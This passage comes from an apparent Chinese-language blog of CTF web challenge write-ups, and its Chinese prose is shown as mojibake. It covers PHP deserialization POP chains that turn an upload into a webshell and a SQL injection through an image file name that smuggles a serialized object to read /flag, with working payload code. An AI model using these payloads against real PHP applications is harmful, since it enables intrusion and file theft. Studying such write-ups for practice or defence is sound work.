language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å¯ä»¥å¾—åˆ°å¦‚æœè§¦å‘äº†callæ–¹æ³•ï¼Œå°±å¯ä»¥è§¦å‘getæ–¹æ³•ã€‚å› ä¸ºProfileç±»æ²¡æœ‰nameå±æ€§ï¼Œè€Œcallæ–¹æ³•ä¸­è®¿é—®äº†è¿™ä¸ªå±æ€§ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ except[$name]&#x3D;&#x3D;upload_imgï¼Œå°±å¯ä»¥è°ƒç”¨upload_imgæ–¹æ³•ã€‚</p></blockquote><p>å†æ‰¾ä¸€ä¸‹è°èƒ½è§¦å‘callæ–¹æ³•</p><p>Register::destruct</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;registed)&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">index</span>();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><blockquote><p>è®©checkerä¸ºProfileç±»å³å¯</p></blockquote><p>popé“¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Register</span>::<span class="variable constant_">destruct</span> â†’ <span class="title class_">Profile</span>::<span class="variable constant_">call</span> â†’ <span class="title class_">Profile</span>::<span class="variable constant_">get</span> â†’ <span class="title class_">Profile</span>::<span class="variable constant_">upload_img</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¦åŠ å‘½åç©ºé—´ï¼Œå¦åˆ™phpä¸çŸ¥é“åºåˆ—åŒ–å“ªä¸€ä¸ªç±»ã€‚</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">web</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$profile</span>-&gt;except = [<span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>-&gt;img = <span class="string">&quot;upload_img&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;ext = <span class="string">&quot;png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename_tmp = <span class="string">&quot;./upload/c47b21fcf8f0bc8b3920541abd8024fd/10fb15c77258a991b0028080a64fb42d.png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename = <span class="string">&quot;./upload/c47b21fcf8f0bc8b3920541abd8024fd/10fb15c77258a991b0028080a64fb42d.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$register</span> = <span class="keyword">new</span> <span class="title class_">Register</span>();</span><br><span class="line"><span class="variable">$register</span>-&gt;registed = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$register</span>-&gt;checker = <span class="variable">$profile</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$register</span>)));</span><br></pre></td></tr></table></figure><p>æŠŠå¾—åˆ°çš„åºåˆ—åŒ–å†…å®¹æ”¾å…¥cookieä¸­ï¼Œåˆ·æ–°å‡ æ¬¡ï¼Œå°±å¯ä»¥å‘ç°æ–‡ä»¶åå˜åŒ–ï¼Œæœ¨é©¬æ–‡ä»¶ç”Ÿæ•ˆã€‚</p><h2 id="å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "><a href="#å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "></a>[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h2><p>ä¿¡æ¯æ”¶é›†</p><ol><li><p>æºç ä¸Šä¼ åˆ°gitubä¸Šäº†</p><p><img src="/../images/1583830520899-1687419234884.png" alt="img"></p><p><img src="/../images/1583830536747-1687419234885.png" alt="img"></p><p><img src="/../images/image-20220807130328561-1687419234885.png" alt="image-20220807130328561"></p></li><li><p>show.phpä¸­çš„æç¤º</p><p><img src="/../images/image-20220807130405750-1687419234885.png" alt="image-20220807130405750"></p><blockquote><p>åŠæˆå“ï¼Œåªæœ‰æ–‡ä»¶çš„åå­—è¢«ä¿å­˜ã€‚</p></blockquote></li></ol><p>ä»£ç å®¡è®¡</p><ol><li><p>åºåˆ—åŒ–å…¥å£</p><p>helperç±»</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;file&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#è·å¾—æ–‡ä»¶å„ç§ä¿¡æ¯</span></span><br><span class="line"><span class="variable">$fileinfo</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getfile</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;title&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;title&#x27;</span>];<span class="comment">#åŸæ–‡ä»¶å</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;filename&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;filename&#x27;</span>];<span class="comment">#éšæœºå</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;ext&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;ext&#x27;</span>];<span class="comment">#åç¼€</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;path&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;path&#x27;</span>];<span class="comment">#è·¯å¾„</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#åºåˆ—åŒ–å­˜å‚¨æ–‡ä»¶çš„å¤§å°</span></span><br><span class="line"><span class="variable">$img_ext</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="variable">$input</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"><span class="variable">$my_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;width&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">0</span>],<span class="string">&quot;height&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;attr&quot;</span>] = <span class="title function_ invoke__">serialize</span>(<span class="variable">$my_ext</span>);</span><br><span class="line">    <span class="comment">#å°†æ–‡ä»¶ä¿¡æ¯æ’å…¥åˆ°æ•°æ®åº“ä¸­</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$array</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="subst">$id</span>.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#getfile</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#éšæœºå</span></span><br><span class="line"><span class="variable">$basename</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">uniqid</span>()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="comment">#å¤„ç†æ–‡ä»¶åç¼€å</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$info</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line"><span class="variable">$cate_exts</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$cate_exts</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">#title=æ–‡ä»¶å</span></span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;title&#x27;</span>=&gt;<span class="variable">$title</span>,<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="variable">$ext</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="variable language_">$this</span>-&gt;folder.<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$data</span> || !<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insert_array</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>(<span class="variable">$con</span>)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.<span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql_fields</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$sql_val</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">#å¤„ç†æ–‡ä»¶å„ç§ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line"><span class="variable">$key_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$value_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line"><span class="variable">$sql_fields</span>[] = <span class="string">&quot;`&quot;</span>.<span class="variable">$key_temp</span>.<span class="string">&quot;`&quot;</span>;</span><br><span class="line"><span class="variable">$sql_val</span>[] = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$value_temp</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">#insertæ’å…¥æ–‡ä»¶å„ç§ä¿¡æ¯</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO images (&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_fields</span>)).<span class="string">&quot;) VALUES(&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_val</span>)).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_insert_id</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç»è¿‡ä¸Šé¢çš„ä»£ç å®¡è®¡å¯çŸ¥ï¼Œåªå¯¹æ–‡ä»¶çš„åç¼€åä½œäº†å¤„ç†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å‚æ—¶èƒ½åˆ©ç”¨æ–‡ä»¶åå³title</p><p>å¹¶ä¸”å…¶å°†æ–‡ä»¶åä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œå°±å¯èƒ½å­˜åœ¨sqlæ³¨å…¥ã€‚</p><p><code>$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</code></p><p>â†’<code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</code></p></blockquote></li><li><p>ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>())&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">    <span class="variable">$attr_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line"><span class="variable">$attr</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$attr_temp</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>åªå°†attrè¿›è¡Œååºåˆ—åŒ–</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ titleä½¿å¾—atträ¸ºæˆ‘ä»¬æ„é€ çš„åºåˆ—åŒ–å†…å®¹ã€‚</p><p><code>title=1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,payload)#</code></p><p><code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</code></p><p>â†’<code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39; 1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,payload)#&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;)</code></p></blockquote></li><li><p>åˆ©ç”¨</p><p>helpç±»</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;ifview == False)&#123;</span><br><span class="line"><span class="keyword">return</span> False;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°è°ƒç”¨äº†view_files</p><p>helpç±»</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">view_files</span>(<span class="variable">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç»¼ä¸Šåˆ©ç”¨çš„å±æ€§</p><p>help-&gt;ifview &#x3D; True</p><p>help-&gt;config &#x3D; flagè·¯å¾„</p></blockquote><p>popé“¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$ifview</span> = True; </span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">helper</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;</span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;*ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;*config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸º</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ååºåˆ—åŒ–å‰<code>$attr_temp = str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);</code></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è½¬æ¢ä¸º16è¿›åˆ¶ ä¸èƒ½æœ‰å¼•å·</span></span><br><span class="line"><span class="number">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#`</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807140140896-1687419234886.png" alt="image-20220807140140896"></p><p><img src="/../images/image-20220807140151143-1687419234886.png" alt="image-20220807140151143"></p></li></ol><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><h3 id="1-å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–"><a href="#1-å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–" class="headerlink" title="1.å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–"></a>1.å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–</h3><h3 id="2-ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹"><a href="#2-ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹" class="headerlink" title="2.ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹"></a>2.ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹</h3><p>ä¼ å‚strâ†’is_valid()å‡½æ•°è¿‡æ»¤â†’unserialize()å‡½æ•°è§¦å‘destruct()å‡½æ•°ï¼šåˆ¤æ–­opâ†’è°ƒç”¨process()å‡½æ•°ï¼Œopä¸º2æ—¶â†’è°ƒç”¨read()å‡½æ•°</p><h3 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">ä¸ä¿®æ”¹å±æ€§ï¼Œä½¿ç”¨å¤§S</span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\00*\00op&quot;</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">&quot;\00*\00filename&quot;</span>;S:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;S:<span class="number">10</span>:<span class="string">&quot;\00*\00content&quot;</span>;S:<span class="number">7</span>:<span class="string">&quot;N;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ï¼ˆ1ï¼‰opçš„å€¼"><a href="#ï¼ˆ1ï¼‰opçš„å€¼" class="headerlink" title="ï¼ˆ1ï¼‰opçš„å€¼"></a>ï¼ˆ1ï¼‰opçš„å€¼</h4><p>å¯ä»¥ä¸ºâ€™   2â€™å’Œ2æ¥ä½¿destruct()ä¸­çš„ä¸æˆç«‹</p><p><img src="https://khaz.top/typora/images/image-20220403152704038.png" alt="image-20220403152704038"></p><p>ç»•è¿‡process()çš„</p><p><img src="https://khaz.top/typora/images/image-20220403152748861.png" alt="image-20220403152748861"></p><h4 id="ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic-x2F-ä½¿ç”¨å¤§S"><a href="#ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic-x2F-ä½¿ç”¨å¤§S" class="headerlink" title="ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic&#x2F;ä½¿ç”¨å¤§S"></a>ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic&#x2F;ä½¿ç”¨å¤§S</h4><p><img src="https://khaz.top/typora/images/image-20220403152827512.png" alt="image-20220403152827512"></p><p>1.åªå…è®¸å¯æ‰“å°å­—ç¬¦ï¼Œè€ŒåŸå…ˆæ˜¯protectedç±»å‹ï¼Œåºåˆ—åŒ–ä»¥åä¼šæœ‰ä¸å¯æ‰“å°å­—ç¬¦%00</p><p>è€ŒæŸ¥è¯¢å¾—çŸ¥åœ¨ PHP7.2+çš„ç¯å¢ƒä¸­ï¼Œä½¿ç”¨ public ä¿®é¥°æˆå‘˜å¹¶åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–åæˆå‘˜ä¹Ÿä¼šè¢« public 